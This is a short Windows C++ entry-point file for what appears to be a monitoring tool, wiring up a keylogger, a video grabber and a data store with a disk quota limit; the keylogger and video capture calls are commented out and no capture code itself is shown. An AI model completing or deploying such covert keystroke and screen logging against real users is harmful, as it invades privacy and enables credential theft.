#include <Windows.h>
#include "DataAccumulator.h"
#include "DiskQuotaWatcher.h"
#include "DataProvider.h"
#include "VideoGrabber.h"
#include "KeyLogger.h"

int WINAPI WinMain ( HINSTANCE hInstance, HINSTANCE hPrevInstance,
					LPSTR lpCmdLine, int nCmdShow )
{
	DataAccumulator* dataAccumulator = new DataAccumulator();
	DiskQuotaWatcher* quotaKeeper = new DiskQuotaWatcher(DataProvider::DATA_DIR, DiskQuotaWatcher::DEFAULT_QUOTA);
	quotaKeeper->KeepLogsWithinQuota();
	//VideoGrabber* videoGrabber = new VideoGrabber();
	//KeyLogger* keyLogger = new KeyLogger();

	//videoGrabber->SetDataAccumulator(dataAccumulator);
	//videoGrabber->Init();
	//keyLogger->SetDataAccumulator(dataAccumulator);
	//keyLogger->Init();

	MSG Msg; // save window messages here.

    while (GetMessage (&Msg, NULL, 0, 0))
    {
        TranslateMessage(&Msg); // Translate virtual-key messages to character messages
        DispatchMessage(&Msg); // Send message to WindowProcedure
    }

	//keyLogger->Finalize();

	//delete videoGrabber;
	//delete keyLogger;
	delete quotaKeeper;
	delete dataAccumulator;
	return Msg.wParam;
}
